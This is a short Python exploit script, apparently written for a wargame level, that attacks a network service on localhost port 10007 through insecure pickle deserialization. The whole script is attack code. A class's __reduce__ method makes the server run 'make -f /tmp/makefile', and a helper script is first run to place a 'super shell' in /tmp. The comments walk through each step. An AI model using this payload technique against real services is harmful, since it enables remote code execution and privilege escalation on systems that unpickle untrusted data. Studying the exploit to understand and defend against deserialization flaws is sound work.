#!/usr/bin/python
##
# this script makes a call to the vulnerable service
# and sends a pickled subprocess call to it, such that
# it is run when pickle.loads is run
##
import pickle
import socket
import subprocess
 
class Make(object):
  def __reduce__(self):
    return (subprocess.call, (('make','-f','/tmp/makefile'),))

# move our super shell to /tmp
subprocess.call(['./levelXX.sh'])

# create a socket for the service
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect the socket to the service
s.connect(('localhost', 10007))
# send the pickled subprocess (to call levelXX)
s.send(pickle.dumps(Make()))
s.close # close the connection
